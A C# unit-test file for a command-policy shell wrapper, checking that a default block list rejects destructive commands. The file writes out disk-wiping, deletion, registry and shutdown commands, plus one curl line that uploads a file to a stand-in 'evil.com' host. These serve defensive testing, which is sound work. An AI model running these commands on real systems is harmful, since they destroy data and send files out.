using SystemHarness.Windows;

namespace SystemHarness.Tests.Shell;

[Trait("Category", "CI")]
public class CommandPolicyTests
{
    [Fact]
    public void DefaultPolicy_BlocksFormat()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("format", "C: /FS:NTFS").GetAwaiter().GetResult());
        Assert.Contains("blocked", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void DefaultPolicy_BlocksShutdown()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("shutdown", "/s /t 0").GetAwaiter().GetResult());
    }

    [Fact]
    public void DefaultPolicy_BlocksRmRf()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("rm -rf /tmp/important").GetAwaiter().GetResult());
        Assert.Contains("blocked", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void DefaultPolicy_BlocksDelRecursive()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("del /S C:\\temp\\*").GetAwaiter().GetResult());
    }

    [Fact]
    public void DefaultPolicy_BlocksRegDelete()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("reg delete HKCU\\Software\\Test /f").GetAwaiter().GetResult());
    }

    [Fact]
    public void DefaultPolicy_BlocksDiskpart()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("diskpart", "/s script.txt").GetAwaiter().GetResult());
    }

    [Fact]
    public async Task DefaultPolicy_AllowsSafeCommands()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var result = await shell.RunAsync("cmd", "/C echo hello");
        Assert.True(result.Success);
        Assert.Contains("hello", result.StdOut);
    }

    [Fact]
    public async Task DefaultPolicy_AllowsDir()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var result = await shell.RunAsync("dir");
        Assert.True(result.Success);
    }

    [Fact]
    public void CustomPolicy_BlocksCustomPattern()
    {
        var policy = new CommandPolicy()
            .BlockPattern(@"curl\s+.*--upload");

        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("curl --upload-file data.txt http://evil.com").GetAwaiter().GetResult());
    }

    [Fact]
    public void CustomPolicy_BlocksCustomProgram()
    {
        var policy = new CommandPolicy()
            .BlockProgram("notepad");

        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("notepad.exe", "test.txt").GetAwaiter().GetResult());
    }

    [Fact]
    public void EmptyPolicy_AllowsEverything()
    {
        var policy = new CommandPolicy();
        // No violation for any command
        Assert.Null(typeof(CommandPolicy)
            .GetMethod("CheckViolation", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)!
            .Invoke(policy, ["format", "C:"]));
    }

    [Fact]
    public void ExceptionContainsBlockedCommand()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("shutdown", "/s /t 0").GetAwaiter().GetResult());
        Assert.Equal("shutdown /s /t 0", ex.BlockedCommand);
    }

    // --- Edge case tests (cycle 227) ---

    [Fact]
    public void FullPath_ProgramBlocked_AfterNormalization()
    {
        var policy = CommandPolicy.CreateDefault();
        // Path.GetFileNameWithoutExtension("C:\\Windows\\System32\\format.exe") → "format"
        var result = CheckViolation(policy, @"C:\Windows\System32\format.exe", "D:");
        Assert.NotNull(result);
        Assert.Contains("format", result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void CaseInsensitive_ProgramBlocked()
    {
        var policy = CommandPolicy.CreateDefault();
        // HashSet uses OrdinalIgnoreCase — "FORMAT" should match "format"
        var result = CheckViolation(policy, "FORMAT", "C:");
        Assert.NotNull(result);
    }

    [Fact]
    public void FluentChaining_BothBlocksWork()
    {
        var policy = new CommandPolicy()
            .BlockProgram("dangerous")
            .BlockPattern(@"--force-delete");

        Assert.NotNull(CheckViolation(policy, "dangerous", ""));
        Assert.NotNull(CheckViolation(policy, "cleanup", "--force-delete all"));
        Assert.Null(CheckViolation(policy, "safe-tool", "--verbose"));
    }

    [Fact]
    public void DefaultPolicy_BlocksReboot()
    {
        var policy = CommandPolicy.CreateDefault();
        Assert.NotNull(CheckViolation(policy, "reboot", ""));
    }

    [Fact]
    public void DefaultPolicy_BlocksFdisk()
    {
        var policy = CommandPolicy.CreateDefault();
        Assert.NotNull(CheckViolation(policy, "fdisk", "/dev/sda"));
    }

    [Fact]
    public void DefaultPolicy_BlocksRdRecursive()
    {
        var policy = CommandPolicy.CreateDefault();
        Assert.NotNull(CheckViolation(policy, "cmd", "/C rd /s /q C:\\important"));
    }

    [Fact]
    public void DefaultPolicy_BlocksDdToDevice()
    {
        var policy = CommandPolicy.CreateDefault();
        Assert.NotNull(CheckViolation(policy, "dd", "if=/dev/zero of=/dev/sda bs=1M"));
    }

    [Fact]
    public void DefaultPolicy_BlocksMkfsPattern()
    {
        var policy = CommandPolicy.CreateDefault();
        // Blocked both as program ("mkfs") and as pattern ("mkfs.")
        Assert.NotNull(CheckViolation(policy, "mkfs", ""));
        Assert.NotNull(CheckViolation(policy, "bash", "-c mkfs.ext4 /dev/sda1"));
    }

    [Fact]
    public void DefaultPolicy_BlocksRawDiskWrite()
    {
        var policy = CommandPolicy.CreateDefault();
        Assert.NotNull(CheckViolation(policy, "echo", "data > /dev/sdb"));
    }

    [Fact]
    public void CheckViolation_AllowedCommand_ReturnsNull()
    {
        var policy = CommandPolicy.CreateDefault();
        Assert.Null(CheckViolation(policy, "cmd", "/C echo hello"));
        Assert.Null(CheckViolation(policy, "dir", ""));
        Assert.Null(CheckViolation(policy, "git", "status"));
    }

    [Fact]
    public void CheckViolation_BlockedProgram_MessageContainsProgramName()
    {
        var policy = CommandPolicy.CreateDefault();
        var result = CheckViolation(policy, "shutdown", "/s");
        Assert.NotNull(result);
        Assert.Contains("shutdown", result);
        Assert.Contains("blocked", result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void CheckViolation_BlockedPattern_MessageContainsPattern()
    {
        var policy = CommandPolicy.CreateDefault();
        var result = CheckViolation(policy, "reg", "delete HKLM\\Software\\Test");
        Assert.NotNull(result);
        Assert.Contains("pattern", result, StringComparison.OrdinalIgnoreCase);
    }

    // --- PolicyEnforcingShell edge cases (cycle 229) ---

    [Fact]
    public void PolicyEnforcingShell_NullInner_Throws()
    {
        Assert.Throws<ArgumentNullException>(
            () => new PolicyEnforcingShell(null!, CommandPolicy.CreateDefault()));
    }

    [Fact]
    public void PolicyEnforcingShell_NullPolicy_Throws()
    {
        Assert.Throws<ArgumentNullException>(
            () => new PolicyEnforcingShell(new WindowsShell(), null!));
    }

    [Fact]
    public void PolicyEnforcingShell_SingleArgRunAsync_WrapsAsCmd()
    {
        // Single-arg RunAsync wraps as "cmd.exe /C {command}" for pattern checking
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        // "reg delete" should be caught by pattern even via single-arg overload
        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("reg delete HKCU\\Test /f").GetAwaiter().GetResult());
        Assert.Equal("reg delete HKCU\\Test /f", ex.BlockedCommand);
    }

    [Fact]
    public void CommandPolicyException_InheritsFromHarnessException()
    {
        var ex = new CommandPolicyException("test");
        Assert.IsAssignableFrom<HarnessException>(ex);
        Assert.IsAssignableFrom<Exception>(ex);
    }

    [Fact]
    public void CommandPolicyException_BlockedCommand_NullByDefault()
    {
        var ex = new CommandPolicyException("some violation");
        Assert.Null(ex.BlockedCommand);
        Assert.Equal("some violation", ex.Message);
    }

    [Fact]
    public void HarnessException_InnerException_Preserved()
    {
        var inner = new InvalidOperationException("root cause");
        var ex = new HarnessException("wrapper", inner);
        Assert.Equal("wrapper", ex.Message);
        Assert.Same(inner, ex.InnerException);
    }

    // --- 1-arg RunAsync BlockProgram bypass tests ---

    [Theory]
    [InlineData("format C:")]
    [InlineData("format C: /FS:NTFS")]
    [InlineData("shutdown /s /t 0")]
    [InlineData("diskpart /s script.txt")]
    [InlineData("reboot")]
    [InlineData("mkfs /dev/sda1")]
    [InlineData("fdisk /dev/sda")]
    public void SingleArgRunAsync_BlockedProgram_IsBlocked(string command)
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync(command).GetAwaiter().GetResult());
        Assert.Equal(command, ex.BlockedCommand);
        Assert.Contains("blocked", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void SingleArgRunAsync_CustomBlockedProgram_IsBlocked()
    {
        var policy = new CommandPolicy().BlockProgram("mytool");
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("mytool --dangerous-flag").GetAwaiter().GetResult());
        Assert.Equal("mytool --dangerous-flag", ex.BlockedCommand);
    }

    [Fact]
    public void SingleArgRunAsync_BlockedPattern_StillWorks()
    {
        var policy = CommandPolicy.CreateDefault();
        var shell = new PolicyEnforcingShell(new WindowsShell(), policy);

        // Pattern-based blocks should still work via the cmd.exe /C fallback
        var ex = Assert.Throws<CommandPolicyException>(
            () => shell.RunAsync("del /S C:\\temp\\*").GetAwaiter().GetResult());
        Assert.Contains("pattern", ex.Message, StringComparison.OrdinalIgnoreCase);
    }

    private static string? CheckViolation(CommandPolicy policy, string program, string arguments)
    {
        return (string?)typeof(CommandPolicy)
            .GetMethod("CheckViolation", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)!
            .Invoke(policy, [program, arguments]);
    }
}
